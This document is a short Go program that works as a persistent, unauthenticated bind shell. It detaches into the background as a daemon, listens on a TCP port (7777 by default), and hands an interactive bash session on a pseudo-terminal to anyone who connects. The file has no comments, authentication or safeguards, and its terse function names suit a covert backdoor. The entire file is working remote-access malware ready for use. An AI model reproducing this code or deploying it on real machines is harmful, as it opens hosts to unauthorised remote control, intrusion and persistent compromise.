package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"

	"github.com/creack/pty"
)

func s(conn net.Conn, pty *os.File) {
	io.Copy(conn, pty)
}

func r(conn net.Conn, pty *os.File) {
	io.Copy(pty, conn)
}

func cAddr() string {
	if len(os.Args) > 1 && os.Args[1] != "" {
		arg := os.Args[1]

		if strings.Contains(arg, ":") {
			return arg
		}
		return ":" + arg
	}
	return ":7777"
}

func daemon() {
	if os.Getenv("socket") == "1" {
		return
	}

	c := exec.Command(os.Args[0], os.Args[1:]...)

	c.SysProcAttr = &syscall.SysProcAttr{Setsid: true}

	c.Env = append(os.Environ(), "socket=1")

	c.Stdin, c.Stdout, c.Stderr = nil, nil, nil

	if err := c.Start(); err != nil {
		os.Exit(1)
	}
	os.Exit(0)

}

func main() {
	daemon()
	addr := cAddr()
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer ln.Close()

	for {
		cmd := exec.Command("bash")

		conn, err := ln.Accept()
		if err != nil {
			continue
		}

		pty, err := pty.Start(cmd)
		if err != nil {
			conn.Close()
			continue
		}

		go func() {
			defer conn.Close()
			defer pty.Close()
			s(conn, pty)
		}()

		go func() {
			defer conn.Close()
			defer pty.Close()
			r(conn, pty)
		}()
	}
}
